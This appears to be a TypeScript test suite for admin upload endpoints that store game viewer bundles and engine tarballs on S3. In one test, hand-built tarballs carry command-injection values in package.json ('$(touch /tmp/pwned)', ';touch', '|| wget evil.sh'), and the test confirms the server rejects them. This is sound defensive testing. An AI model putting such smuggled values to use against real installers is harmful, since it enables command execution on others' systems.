// Admin bundle-upload endpoints (#268): viewer files + engine tarballs stored
// on S3, GameInfo updated. Uses the same injected S3 mock as the avatar specs.
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, describe, it } from "node:test";
import type { GameInfoDoc } from "@bgs/models";
import { ObjectId } from "mongodb";
import { colls, db } from "../../config/db.ts";
import env from "../../config/env.ts";
import { testUser } from "../../config/test-helpers.ts";
import { createAccessToken, generateRefreshCode, hashRefreshCode } from "../../models/jwtrefreshtokens.ts";
import { interceptS3Fetches, makeS3Mock } from "../../services/s3-mock.ts";
import { s3Fetch, setS3ClientsForTests } from "../../services/s3.ts";

const baseURL = () => `http://${env.listen.host}:${env.listen.port.api}`;

const GAME = "bundle-test";
const VERSION = 1;
const VIEWER_JS = Buffer.from(`window.bundleTest = { launch: () => ({ on(){}, emit(){} }) };`);
const VIEWER_CSS = Buffer.from("#app { background: black; }");
const jsHash = createHash("sha256").update(VIEWER_JS).digest("hex").slice(0, 16);

const enginePkg = { name: "@test/uploaded-engine", version: "4.5.6" };
let engineTarball: Buffer;
const engineHash = () => createHash("sha256").update(engineTarball).digest("hex").slice(0, 16);

function makeEngineTarball(pkg: { name: string; version: string } = enginePkg): Buffer {
	// A real `npm pack` tarball: gzip, single package/ root with a package.json.
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bgs-upload-spec-"));
	try {
		const pkgDir = path.join(dir, "pkg");
		fs.mkdirSync(path.join(pkgDir, "dist"), { recursive: true });
		fs.writeFileSync(
			path.join(pkgDir, "package.json"),
			JSON.stringify({ ...pkg, type: "module", main: "dist/engine.mjs" }),
		);
		fs.writeFileSync(path.join(pkgDir, "dist", "engine.mjs"), "export {};\n");
		execFileSync("npm", ["pack", "--pack-destination", dir], { cwd: pkgDir, stdio: "pipe" });
		return fs.readFileSync(path.join(dir, `test-uploaded-engine-${pkg.version}.tgz`));
	} finally {
		fs.rmSync(dir, { recursive: true, force: true });
	}
}

// npm refuses to pack a manifest whose name/version violate its grammar, so a
// hostile tarball is hand-built with tar(1) — same package/ layout npm packs.
function makeRawEngineTarball(pkg: { name: string; version: string }): Buffer {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bgs-upload-spec-raw-"));
	try {
		const pkgDir = path.join(dir, "package");
		fs.mkdirSync(pkgDir, { recursive: true });
		fs.writeFileSync(path.join(pkgDir, "package.json"), JSON.stringify({ ...pkg, type: "module" }));
		const out = path.join(dir, "engine.tgz");
		execFileSync("tar", ["-czf", out, "-C", dir, "package"], { stdio: "pipe" });
		return fs.readFileSync(out);
	} finally {
		fs.rmSync(dir, { recursive: true, force: true });
	}
}

type ApiResult<T> = { status: number; data: T };

async function api<T = unknown>(
	method: string,
	path_: string,
	headers?: Record<string, string>,
	body?: Buffer,
): Promise<ApiResult<T>> {
	const res = await fetch(`${baseURL()}${path_}`, { method, headers, body });
	const data: unknown = res.headers.get("content-type")?.includes("application/json")
		? await res.json()
		: await res.text();
	// oxlint-disable-next-line typescript/no-unsafe-type-assertion -- test helper: callers pick T to match the endpoint's response
	return { status: res.status, data: data as T };
}

async function makeAuthHeaders(userId: ObjectId) {
	const code = generateRefreshCode();
	const tokenDoc = { user: userId, codeHash: hashRefreshCode(code), createdAt: new Date() };
	await colls.jwtRefreshTokens.insertOne(tokenDoc);
	const token = await createAccessToken(tokenDoc, ["all"], true);
	return { Authorization: `Bearer ${token}` };
}

function gameInfoFixture(): GameInfoDoc {
	return {
		_id: { game: GAME, version: VERSION },
		label: "Bundle test",
		viewer: { url: "//cdn.jsdelivr.net/npm/old-viewer@1/dist/viewer.js" },
		engine: { package: { name: "registry-engine", version: "1.0.0" }, entryPoint: "dist/wrapper.js" },
		players: [2],
		meta: { public: true },
	};
}

// Every object stored in the mock bucket, across buckets (empty when nothing
// was ever written — e.g. an auth-rejected upload).
function bucketObjects(mock: ReturnType<typeof makeS3Mock>): Map<string, { body: Buffer; contentType?: string }> {
	return mock.buckets.get(mock.bucketName) ?? new Map();
}

describe("Admin gameinfo bundle uploads (#268)", () => {
	const s3Mock = makeS3Mock();
	const restoreFetchInterceptor = interceptS3Fetches(s3Mock);
	const adminId = new ObjectId();
	const userId = new ObjectId();
	let adminHeaders: Record<string, string>;
	let userHeaders: Record<string, string>;

	before(async () => {
		engineTarball = makeEngineTarball();
		await colls.users.insertOne(testUser({ _id: adminId, authority: "admin" }));
		await colls.users.insertOne(testUser({ _id: userId }));
		adminHeaders = await makeAuthHeaders(adminId);
		userHeaders = await makeAuthHeaders(userId);
	});

	after(async () => {
		setS3ClientsForTests(null);
		restoreFetchInterceptor();
		await db().dropDatabase();
	});

	describe("with S3 enabled", () => {
		before(async () => {
			setS3ClientsForTests(s3Mock.client);
			s3Mock.reset();
			await colls.gameInfos.deleteMany({ "_id.game": GAME });
			await colls.gameInfos.insertOne(gameInfoFixture());
		});

		it("rejects non-admin callers", async () => {
			const res = await api(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/viewer/file?filename=viewer.js`,
				userHeaders,
				VIEWER_JS,
			);
			assert.strictEqual(res.status, 403);
			assert.strictEqual(bucketObjects(s3Mock).size, 0);
		});

		it("rejects unauthenticated callers", async () => {
			const res = await api("POST", `/api/admin/gameinfo/${GAME}/${VERSION}/engine`, {}, engineTarball);
			assert.strictEqual(res.status, 403);
		});

		it("stores a viewer bundle on S3 and returns its public URL", async () => {
			const res = await api<{ url: string }>(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/viewer/file?filename=viewer.js`,
				adminHeaders,
				VIEWER_JS,
			);
			assert.strictEqual(res.status, 200);
			const { url } = res.data;
			const expectedKey = `games/${GAME}/${VERSION}/viewer/${jsHash}/viewer.js`;
			assert.ok(url.endsWith(`/${expectedKey}`), `url ${url} ends with the bundle key`);

			const stored = bucketObjects(s3Mock).get(expectedKey);
			assert.ok(stored, "bundle stored in S3");
			assert.deepStrictEqual(stored.body, VIEWER_JS);
			assert.match(stored.contentType ?? "", /javascript/);

			// The public URL actually serves the bundle (anonymous GET on the bucket).
			const served = await s3Fetch(url);
			assert.strictEqual(served.status, 200);
			assert.deepStrictEqual(Buffer.from(await served.arrayBuffer()), VIEWER_JS);
		});

		it("stores a CSS bundle for the alternate viewer", async () => {
			const res = await api<{ url: string }>(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/viewer/file?filename=viewer.css&alternate=1`,
				adminHeaders,
				VIEWER_CSS,
			);
			assert.strictEqual(res.status, 200);
			const { url } = res.data;
			const cssHash = createHash("sha256").update(VIEWER_CSS).digest("hex").slice(0, 16);
			assert.ok(url.includes(`games/${GAME}/${VERSION}/viewer-alternate/${cssHash}/viewer.css`));
		});

		it("rejects non-js/css viewer filenames", async () => {
			const res = await api(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/viewer/file?filename=evil.exe`,
				adminHeaders,
				VIEWER_JS,
			);
			assert.strictEqual(res.status, 400);
		});

		it("stores an engine tarball and points engine.package at it", async () => {
			const res = await api<GameInfoDoc>(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/engine`,
				adminHeaders,
				engineTarball,
			);
			assert.strictEqual(res.status, 200);
			const doc = res.data;
			assert.deepStrictEqual(doc.engine?.package.name, enginePkg.name);
			assert.deepStrictEqual(doc.engine?.package.version, enginePkg.version);
			const expectedKey = `games/${GAME}/${VERSION}/engine/${engineHash()}/test-uploaded-engine-${enginePkg.version}.tgz`;
			assert.ok(doc.engine?.package.url?.endsWith(`/${expectedKey}`), `engine url ends with the tarball key`);

			const stored = bucketObjects(s3Mock).get(expectedKey);
			assert.ok(stored, "tarball stored in S3");
			assert.deepStrictEqual(stored.body, engineTarball);

			// Persisted on the game doc (the game-server installer reads it from there).
			const saved = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
			assert.strictEqual(saved?.engine?.package.url, doc.engine?.package.url);
		});

		it("rejects a tarball whose package.json name/version violate the npm grammar (#270)", async () => {
			const before_ = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
			const objectsBefore = bucketObjects(s3Mock).size;

			// Shell metacharacters in the tarball's package.json must never reach
			// engine.package — the game-server installer builds npm argv from it.
			for (const pkg of [
				{ name: "x$(touch /tmp/pwned)", version: "1.0.0" },
				{ name: "a;touch /tmp/pwned", version: "1.0.0" },
				{ name: "@test/uploaded-engine", version: "1.0.0 || wget evil.sh" },
			]) {
				const res = await api(
					"POST",
					`/api/admin/gameinfo/${GAME}/${VERSION}/engine`,
					adminHeaders,
					makeRawEngineTarball(pkg),
				);
				assert.strictEqual(res.status, 400, `expected 400 for ${JSON.stringify(pkg)}`);
			}

			const after_ = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
			assert.deepStrictEqual(after_?.engine, before_?.engine, "doc untouched");
			assert.strictEqual(bucketObjects(s3Mock).size, objectsBefore, "no tarball stored in S3");
		});

		it("rejects a non-tarball engine upload without touching the doc", async () => {
			const before_ = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
			const res = await api(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/engine`,
				adminHeaders,
				Buffer.from("not a tarball"),
			);
			assert.strictEqual(res.status, 400);
			const after_ = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
			assert.deepStrictEqual(after_?.engine, before_?.engine);
		});

		it("404s the engine upload for a missing game", async () => {
			const res = await api("POST", `/api/admin/gameinfo/${GAME}/99/engine`, adminHeaders, engineTarball);
			assert.strictEqual(res.status, 404);
		});
	});

	describe("with S3 disabled", () => {
		before(() => {
			setS3ClientsForTests(null);
		});

		it("503s with a clear error", async () => {
			const viewerRes = await api(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/viewer/file?filename=viewer.js`,
				adminHeaders,
				VIEWER_JS,
			);
			assert.strictEqual(viewerRes.status, 503);
			const viewer503 = await api<{ message: string }>(
				"POST",
				`/api/admin/gameinfo/${GAME}/${VERSION}/viewer/file?filename=viewer.js`,
				adminHeaders,
				VIEWER_JS,
			);
			assert.match(viewer503.data.message, /S3/);

			const engineRes = await api("POST", `/api/admin/gameinfo/${GAME}/${VERSION}/engine`, adminHeaders, engineTarball);
			assert.strictEqual(engineRes.status, 503);
		});
	});
});
